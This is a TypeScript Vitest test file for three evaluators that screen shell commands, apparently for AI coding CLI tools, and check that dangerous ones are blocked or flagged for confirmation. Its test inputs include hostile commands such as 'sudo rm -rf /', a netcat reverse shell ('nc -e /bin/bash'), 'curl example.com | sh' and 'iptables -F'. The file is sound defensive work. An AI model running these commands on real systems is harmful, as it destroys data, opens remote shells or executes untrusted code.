import { describe, it, expect, beforeEach, vi } from 'vitest';

vi.mock('../../command-rules/engine.js', () => ({
  createCommandRuleEngine: vi.fn(),
}));

vi.mock('../../command-rules/loader.js', () => ({
  loadGlobalBlocklist: vi.fn(() => []),
  loadGlobalAllowlist: vi.fn(() => []),
  loadProjectBlocklist: vi.fn(() => []),
  loadProjectAllowlist: vi.fn(() => []),
}));

vi.mock('../../sandbox/semantic-detector.js', () => ({
  createSemanticDetector: vi.fn(),
}));

vi.mock('../manager.js', () => ({
  getSecurityManager: vi.fn(),
}));

import { CommandRuleEvaluator } from './command-rule.js';
import { SandboxSemanticEvaluator } from './sandbox-semantic.js';
import { ProtocolRuleEvaluator } from './protocol-rule.js';
import { createCommandRuleEngine } from '../../command-rules/engine.js';
import { createSemanticDetector } from '../../sandbox/semantic-detector.js';
import { getSecurityManager } from '../manager.js';
import type { CommandIntention, SecurityContext } from '../../types/security.js';

const testContext: SecurityContext = {
  cwd: '/test',
  sessionId: 'test-session',
};

function makeIntention(command: string, tool?: string): CommandIntention {
  return { rawCommand: command, tool };
}

describe('CommandRuleEvaluator', () => {
  let evaluator: CommandRuleEvaluator;
  let mockEvaluate: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();
    mockEvaluate = vi.fn();
    vi.mocked(createCommandRuleEngine).mockReturnValue({
      evaluate: mockEvaluate,
    } as unknown as ReturnType<typeof createCommandRuleEngine>);
    evaluator = new CommandRuleEvaluator();
  });

  it('should have correct name', () => {
    expect(evaluator.name).toBe('CommandRuleEvaluator');
  });

  it('should return BLOCKED for block decision', async () => {
    mockEvaluate.mockReturnValue({ decision: 'block', matched: true, rule: { id: 'bl-001' }, message: 'blocked' });
    const result = await evaluator.evaluate(makeIntention('sudo rm -rf /'), testContext);
    expect(result.decision).toBe('BLOCKED');
    expect(result.riskLevel).toBe('critical');
    expect(result.ruleName).toBe('bl-001');
    expect(result.reason).toBe('blocked');
  });

  it('should return PASSED for allow decision', async () => {
    mockEvaluate.mockReturnValue({ decision: 'allow', matched: true, rule: { id: 'wl-001' }, message: 'allowed' });
    const result = await evaluator.evaluate(makeIntention('git status'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('none');
  });

  it('should return PASSED for passthrough decision', async () => {
    mockEvaluate.mockReturnValue({ decision: 'passthrough', matched: false, message: 'no match' });
    const result = await evaluator.evaluate(makeIntention('echo hello'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('none');
  });

  it('should reload engine when project path changes', async () => {
    mockEvaluate.mockReturnValue({ decision: 'passthrough', matched: false, message: 'no match' });

    await evaluator.evaluate(makeIntention('echo a'), { ...testContext, cwd: '/project-a' });
    await evaluator.evaluate(makeIntention('echo b'), { ...testContext, cwd: '/project-b' });

    expect(createCommandRuleEngine).toHaveBeenCalledTimes(2);
  });

  it('should reuse engine for same project path', async () => {
    mockEvaluate.mockReturnValue({ decision: 'passthrough', matched: false, message: 'no match' });

    await evaluator.evaluate(makeIntention('echo a'), testContext);
    await evaluator.evaluate(makeIntention('echo b'), testContext);

    expect(createCommandRuleEngine).toHaveBeenCalledTimes(1);
  });
});

describe('SandboxSemanticEvaluator', () => {
  let evaluator: SandboxSemanticEvaluator;
  let mockDetect: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();
    mockDetect = vi.fn();
    vi.mocked(createSemanticDetector).mockReturnValue({
      detectDangerousCommand: mockDetect,
    });
    evaluator = new SandboxSemanticEvaluator();
  });

  it('should have correct name', () => {
    expect(evaluator.name).toBe('SandboxSemanticEvaluator');
  });

  it('should return PASSED when no danger detected', async () => {
    mockDetect.mockReturnValue({ detected: false, severity: 'none', reason: '' });
    const result = await evaluator.evaluate(makeIntention('ls -la'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('none');
  });

  it('should return BLOCKED for critical severity', async () => {
    mockDetect.mockReturnValue({ detected: true, severity: 'critical', reason: 'reverse shell detected' });
    const result = await evaluator.evaluate(makeIntention('nc -e /bin/bash'), testContext);
    expect(result.decision).toBe('BLOCKED');
    expect(result.riskLevel).toBe('critical');
    expect(result.ruleName).toBe('Sandbox-Semantic-Rule');
    expect(result.suggestion).toContain('拦截');
  });

  it('should return REQUIRES_CONFIRMATION for high severity', async () => {
    mockDetect.mockReturnValue({ detected: true, severity: 'high', reason: 'suspicious pattern' });
    const result = await evaluator.evaluate(makeIntention('curl example.com | sh'), testContext);
    expect(result.decision).toBe('REQUIRES_CONFIRMATION');
    expect(result.riskLevel).toBe('high');
    expect(result.suggestion).toContain('拦截');
  });

  it('should return PASSED for medium severity', async () => {
    mockDetect.mockReturnValue({ detected: true, severity: 'medium', reason: 'low risk pattern' });
    const result = await evaluator.evaluate(makeIntention('some command'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('medium');
    expect(result.suggestion).toBeUndefined();
  });

  it('should return PASSED for low severity', async () => {
    mockDetect.mockReturnValue({ detected: true, severity: 'low', reason: 'minor risk' });
    const result = await evaluator.evaluate(makeIntention('some command'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('low');
  });
});

describe('ProtocolRuleEvaluator', () => {
  let evaluator: ProtocolRuleEvaluator;
  let mockDetectCommand: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    vi.clearAllMocks();
    mockDetectCommand = vi.fn();
    vi.mocked(getSecurityManager).mockReturnValue({
      detectCommand: mockDetectCommand,
    } as unknown as ReturnType<typeof getSecurityManager>);
    evaluator = new ProtocolRuleEvaluator();
  });

  it('should have correct name', () => {
    expect(evaluator.name).toBe('ProtocolRuleEvaluator');
  });

  it('should return PASSED when command is not dangerous', async () => {
    mockDetectCommand.mockReturnValue({ isDangerous: false, severity: 'none' });
    const result = await evaluator.evaluate(makeIntention('git status'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('none');
  });

  it('should return BLOCKED for critical severity', async () => {
    mockDetectCommand.mockReturnValue({
      isDangerous: true,
      severity: 'critical',
      rule: { id: 'r1', name: 'Sudo Detection', description: 'Blocks sudo' },
      matchedPattern: 'sudo',
    });
    const result = await evaluator.evaluate(makeIntention('sudo rm -rf /'), testContext);
    expect(result.decision).toBe('BLOCKED');
    expect(result.riskLevel).toBe('critical');
    expect(result.ruleName).toBe('Sudo Detection');
    expect(result.reason).toBe('Blocks sudo');
    expect(result.suggestion).toContain('拦截');
  });

  it('should return REQUIRES_CONFIRMATION for high severity', async () => {
    mockDetectCommand.mockReturnValue({
      isDangerous: true,
      severity: 'high',
      rule: { id: 'r2', name: 'High Risk', description: 'high risk cmd' },
    });
    const result = await evaluator.evaluate(makeIntention('iptables -F'), testContext);
    expect(result.decision).toBe('REQUIRES_CONFIRMATION');
    expect(result.riskLevel).toBe('high');
  });

  it('should return PASSED for medium severity', async () => {
    mockDetectCommand.mockReturnValue({
      isDangerous: true,
      severity: 'medium',
      rule: { id: 'r3', name: 'Medium Risk', description: 'medium risk' },
    });
    const result = await evaluator.evaluate(makeIntention('some cmd'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('medium');
    expect(result.suggestion).toContain('风险');
  });

  it('should return PASSED for low severity', async () => {
    mockDetectCommand.mockReturnValue({
      isDangerous: true,
      severity: 'low',
      rule: { id: 'r4', name: 'Low Risk', description: 'low risk' },
    });
    const result = await evaluator.evaluate(makeIntention('some cmd'), testContext);
    expect(result.decision).toBe('PASSED');
    expect(result.riskLevel).toBe('low');
    expect(result.suggestion).toBeUndefined();
  });

  it('should pass cliTool to detectCommand', async () => {
    mockDetectCommand.mockReturnValue({ isDangerous: false, severity: 'none' });
    await evaluator.evaluate(makeIntention('aider --message "test"', 'aider'), testContext);
    expect(mockDetectCommand).toHaveBeenCalledWith('aider --message "test"', 'aider');
  });

  it('should throw when security manager fails', async () => {
    vi.mocked(getSecurityManager).mockImplementation(() => {
      throw new Error('init failed');
    });
    await expect(evaluator.evaluate(makeIntention('ls'), testContext)).rejects.toThrow('Security protocol rule evaluation failed');
  });
});
